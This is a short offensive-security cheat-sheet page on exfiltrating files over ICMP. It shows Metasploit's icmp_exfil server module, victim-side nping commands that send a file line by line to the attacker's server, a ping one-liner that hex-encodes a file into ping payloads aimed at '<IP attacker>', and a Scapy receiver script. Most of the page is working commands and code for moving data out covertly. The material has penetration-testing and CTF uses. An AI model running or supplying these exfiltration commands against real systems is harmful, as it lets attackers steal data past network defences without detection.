# ICMP

## ICMP Exfiltration Service (Metasploit)

{% embed url="http://www.nocowsecurity.com/blog/2013/5/30/icmp-exfiltration" %}

This module is designed to provide a server-side component to receive and store files exfiltrated over ICMP echo request packets

```
msf > use auxiliary/server/icmp_exfil
msf auxiliary(icmp_exfil) > show actions
    ...actions...
msf auxiliary(icmp_exfil) > set ACTION < action-name >
msf auxiliary(icmp_exfil) > show options
    ...show and set options...
msf auxiliary(icmp_exfil) > run
```

on victim side:

```
nping --icmp <IP address of Metasploit server> --data-string ^BOF -c1
for /f "tokens=*" %%a in (<filename>) do nping --icmp <IP address of Metasploit server> --data-string "%%a\x0D" -c1
nping --icmp <IP address of Metasploit server> --data-string ^EOF -c1
sed 's/\\x0D/\n/g' <filename>
```

{% embed url="https://youtu.be/y_qBPaKdU7U" %}

## QueenSono

{% hint style="info" %}
* only work on Linux (due to the use of golang net icmp package)
* need `cap_net_raw capabilities`
{% endhint %}

{% embed url="https://github.com/ariary/QueenSono" %}

## Ping

```
#In order to exfiltrate the content of a file via pings you can do:
xxd -p -c 4 /path/file/exfil | while read line; do ping -c 1 -p $line <IP attacker>; done
#This will 4bytes per ping packet (you could probably increase this until 16)
```

```
from scapy.all import *
#This is ippsec receiver created in the HTB machine Mischief
def process_packet(pkt):
    if pkt.haslayer(ICMP):
        if pkt[ICMP].type == 0:
            data = pkt[ICMP].load[-4:] #Read the 4bytes interesting
            print(f"{data.decode('utf-8')}", flush=True, end="")

sniff(iface="tun0", prn=process_packet)
```





